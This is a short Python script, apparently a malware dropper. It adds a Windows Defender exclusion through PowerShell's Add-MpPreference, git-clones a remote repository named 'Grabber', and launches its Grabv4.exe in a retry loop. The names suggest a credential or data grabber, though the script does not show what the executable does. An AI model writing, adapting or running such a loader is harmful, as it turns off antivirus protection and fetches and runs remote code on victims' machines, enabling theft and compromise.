import os
import subprocess
os.mkdir("Grabber")

def add_exclusion(path):
    command = f"Add-MpPreference -ExclusionPath \"{path}\""
    result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
    if result.stderr:
        print(f"Error: {result.stderr}")
    else:
        print(f"Successfully added exclusion for {path}")

# Remplacez ce chemin par le dossier contenant votre fichier
folder_to_exclude = r"C:\Users\Mathis\OneDrive\Documents\Programmations\Grabber\Grabber"
add_exclusion(folder_to_exclude)




os.system("git clone https://github.com/Bastaross/Grabber.git")
path = "Grabber/Grabv4.exe"
while True:
    try:
        subprocess.Popen(path)
        if subprocess.Popen(path):
            break
    except Exception:
        pass
